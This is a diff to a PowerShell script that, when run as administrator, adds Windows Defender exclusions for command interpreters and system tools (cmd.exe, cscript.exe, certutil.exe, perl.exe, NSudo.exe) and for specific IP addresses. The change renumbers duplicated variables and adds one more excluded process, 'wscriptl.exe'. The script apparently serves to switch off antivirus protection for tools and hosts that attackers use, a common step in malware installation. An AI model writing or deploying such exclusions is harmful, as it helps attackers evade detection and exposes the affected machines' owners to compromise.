@@ -55,8 +55,9 @@ $aProcExclusion003="cmd.exe"
 $aProcExclusion004="cscript.exe"
 $aProcExclusion005="python.exe"
 $aProcExclusion006="NSudo.exe"
-$aProcExclusion006="certutil.exe"
-$aProcExclusion006="perl.exe"
+$aProcExclusion007="certutil.exe"
+$aProcExclusion008="perl.exe"
+$aProcExclusion009="wscriptl.exe"
 
 $anIpExclusions001="88.147.147.107"
 $anIpExclusions002="93.189.41.9"
@@ -94,6 +95,7 @@ if( $isAdmin ){
     Add-MpPreference -ExclusionProcess $aProcExclusion006
     Add-MpPreference -ExclusionProcess $aProcExclusion007
     Add-MpPreference -ExclusionProcess $aProcExclusion008
+    Add-MpPreference -ExclusionProcess $aProcExclusion009
 
     Add-MpPreference -ExclusionIpAddress $anIpExclusions001
     Add-MpPreference -ExclusionIpAddress $anIpExclusions002
